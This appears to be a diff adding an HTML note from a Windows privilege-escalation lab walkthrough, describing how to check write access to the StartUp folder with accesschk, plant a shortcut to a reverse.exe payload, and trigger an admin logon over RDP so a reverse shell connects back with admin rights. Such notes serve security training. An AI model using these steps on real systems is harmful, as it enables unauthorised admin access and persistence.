@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Start Up Apps</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Start Up Apps</h1><br/><strong><h1>Start Up Apps</h1></strong><br /><br /><br />Using <strong>accesschk.exe</strong>, note that the BUILTIN\Users group can write files to the StartUp directory:<br /><br /><strong>C:\PrivEsc\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</strong><br /><br />Using cscript, run the <strong>C:\PrivEsc\CreateShortcut.vbs</strong> script which should create a new shortcut to your <strong>reverse.exe</strong> executable in the StartUp directory:<br /><br /><strong>cscript C:\PrivEsc\CreateShortcut.vbs</strong><br /><br />Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:<br /><br /><strong>rdesktop -u admin 10.10.83.22</strong><br /><br />A shell running as admin should connect back to your listener.<br /><br /><strong><h2>END</h2></strong></div>
+</body>
+</html>
